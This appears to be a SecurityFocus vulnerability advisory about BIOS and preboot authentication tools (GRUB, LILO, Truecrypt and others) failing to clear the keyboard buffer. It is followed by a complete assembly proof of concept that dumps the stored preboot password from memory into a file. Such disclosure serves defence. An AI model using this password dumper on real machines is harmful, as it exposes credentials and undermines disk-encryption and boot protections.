source: http://www.securityfocus.com/bid/15751/info

Multiple vendors fail to clear the BIOS (Basic Input-Output System) keyboard buffer after reading the preboot authentication password during the system startup process.

Depending on the operating system running on affected computers, the memory region may or may not be available for user-level access. With Linux operating systems, superuser access is required. With Microsoft Windows operating systems, nonprivileged users may access the keyboard buffer region.

Attackers who obtain the password used for preboot authentication may then use it for further attacks.

UPDATE: Reportedly, the BIOS API calls and the BIOS keyboard buffer are used by various preboot authentication applications to read a password from the keyboard in an insecure manner. These applications are also vulnerable to this issue.

This issue is reported to affect the following software:

- Truecrypt 5.0 for Windows
- DiskCryptor 0.2.6 for Windows and prior
- Secu Star DriveCrypt Plus Pack v3.9 and prior
- Grub Legacy (GNU GRUB 0.97) and prior
- Lilo 22.6.1 and prior versions
- Award BIOS Modular 4.50pg
- Insyde BIOS V190
- Intel Corp BIOS PE94510M.86A.0050.2007.0710.1559 (07/10/2007)
- Hewlett-Packard BIOS 68DTT Ver. F.0D (11/22/2005)
- IBM Lenovo BIOS 7CETB5WW v2.05 (10/13/2006) 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Endrazine endrazine (at) pulltheplug (dot) org [email concealed] ;
; Bios Password Physical Memory Reader ;
; Write to file Windows Compatible version ;
; ;
;Compiling : A86 wbiosw.asm wbiosw.com ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

code segment
org 100h
assume ds:code, es:code, cs:code

start:
mov ah, 09h
mov dx,offset welcome
int 21h

xor ax,ax
int 16h

mov ds, 40h ; This is the input buffer adress
mov si, 01EH ; starting at 40h:01eh
mov di,offset buffer
mov cx,32

daloop:
mov ax,[ds:si]
mov [cs:di],ax
inc di
add si,2 ; Replace this line by add si,4
; if you plan to use it under Dos
loop daloop

mov ds,es

mov ah, 3ch ; MS DOS Create file Function
mov dx, offset fname
xor cx,cx
int 21h

mov ax, 3d01h ; MS DOS Open file Function
int 21h
mov handle,ax

mov ah, 40h
mov bx,handle
mov cx,32
mov dx, offset Msg
int 21h ; Write buffer to file

mov ax,4ch ; Quit
int 21h

handle dw ?
welcome db 'Password dumper by Endrazine (endrazine (at) pulltheplug (dot) org [email concealed])',10,13
db '',10,13
db 'Dumping Password to Password.txt',10,13
db 'Press any Key$',10,13
fname db 'Password.txt',0
Msg db 'Password is : ',0
buffer db 32 dup ?
end start

end
